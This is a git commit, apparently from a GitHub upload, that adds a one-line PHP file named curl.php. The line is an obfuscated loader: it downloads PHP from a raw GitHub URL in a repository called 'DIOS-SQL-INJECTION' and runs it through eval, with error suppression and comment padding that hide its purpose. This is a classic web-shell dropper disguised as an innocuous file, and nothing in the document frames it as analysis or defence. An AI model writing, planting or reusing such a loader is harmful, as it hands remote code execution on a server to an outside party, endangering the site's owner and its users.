080a8e7d6583de7fad5062ed871a38857d75082d
b1dar4 <b1dar4.b4@gmail.com>
2026-02-15 16:12:46 +0700

    Add files via upload

---
+++ curl.php
@@ -0,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(urldecode(urlencode(rawurldecode(rawurlencode("https://raw.githubusercontent.com/b1dar4/DIOS-SQL-INJECTION/refs/heads/main/civil.php"))))));/**/?>
